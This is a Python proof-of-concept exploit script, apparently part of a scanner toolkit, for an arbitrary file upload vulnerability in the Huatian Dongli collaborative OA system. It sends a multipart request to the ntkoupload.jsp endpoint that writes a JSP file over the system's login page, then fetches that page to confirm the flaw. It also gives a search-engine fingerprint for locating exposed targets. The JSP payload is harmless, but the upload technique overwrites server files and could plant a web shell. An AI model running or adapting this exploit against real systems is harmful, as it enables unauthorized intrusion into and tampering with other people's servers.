#!/usr/bin/env python3
# _*_ coding:utf-8 _*_

from dataclasses import fields
from email.mime import multipart
import random
from urllib import response
from importlib_metadata import files
import requests
from requests_toolbelt import MultipartEncoder
from Config.config_requests import ua

requests.packages.urllib3.disable_warnings()
# 脚本信息
######################################################
NAME = '华天动力协同oa系统文件上传'
AUTHOR = "JDQ"
REMARK = '华天动力协同oa系统文件上传'
HUNTER_RULE = 'web.icon=="b7093d421dbebf3fdd76545d4457673a"'
######################################################

# proxies = {
#     "http": 'http://127.0.0.1:8080',
#     "https": 'http://127.0.0.1:8080'
# }
headers = {
    "User-Agent": ua
}
stra = r'''

<% out.println("helloworld");%>'''
m = MultipartEncoder(
    fields={
        "EDITFILE": ("test.txt", stra),
        "newFileName": (None, r"f:/htoa/Tomcat/webapps/OAapp/htpages/app/module/login/normalLoginPageForOther.jsp")
    },
    boundary='---------------------------107161996541389066151862863273'
)
headers['Content-Type'] = m.content_type


def poc(target):

    try:
        r = requests.post(target+'/OAapp/htpages/app/module/trace/component/fileEdit/ntkoupload.jsp', headers=headers, data=m,  # proxies=proxies,
                          verify=False, timeout=5,)
        if r.status_code == 200:
            r = requests.get(
                target+"/OAapp/htpages/app/module/login/normalLoginPageForOther.jsp")
            print(r.text)
            print("[+] 目标 {} 存在漏洞".format(target))

    except Exception as e:
        pass


if __name__ == '__main__':
    poc("http://127.0.0.1")
